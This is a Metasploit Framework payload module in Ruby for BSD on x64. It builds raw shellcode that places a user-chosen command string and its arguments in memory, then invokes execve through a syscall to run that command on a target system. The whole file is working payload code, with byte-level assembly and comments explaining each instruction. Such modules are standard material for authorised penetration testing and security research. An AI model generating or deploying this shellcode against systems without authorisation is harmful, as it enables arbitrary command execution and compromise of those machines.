##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 31

  include Msf::Payload::Single
  include Msf::Payload::Bsd

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'joev',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X64))

    # Register exec options
    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ])
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage(opts={})
    cmd_str = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
    call = "\xe8" + [arg_str.length].pack('V')
    payload =
      "\x48\x31\xd2"+                                 # xor rdx, rdx
      call +                                          # call CMD.len
      arg_str  +                                      # CMD
      "\x5f" +                                        # pop rdi
      if cmd_parts.length > 1
        "\x48\x89\xf9" +                            # mov rcx, rdi
        "\x52" +                                    # push rdx (null)
        # for each arg, push its current memory location on to the stack
        cmd_parts[1..-1].each_with_index.map do |arg, idx|
          "\x48\x81\xc1" +                        # add rcx + ...
          [cmd_parts[idx].length+1].pack('V') +   #
          "\x51"                                  # push rcx (build str array)
        end.join
      else
        "\x52"                                      # push rdx (null)
      end +
      "\x57"+                                         # push rdi
      "\x48\x89\xe6"+                                 # mov rsi, rsp
      "\x48\x31\xc0"+                                 # xor rax, rax
      "\x48\x83\xc8\x3b" +                            # or rax, 0x3b (execve)
      "\x0f\x05"                                      # syscall
  end
end
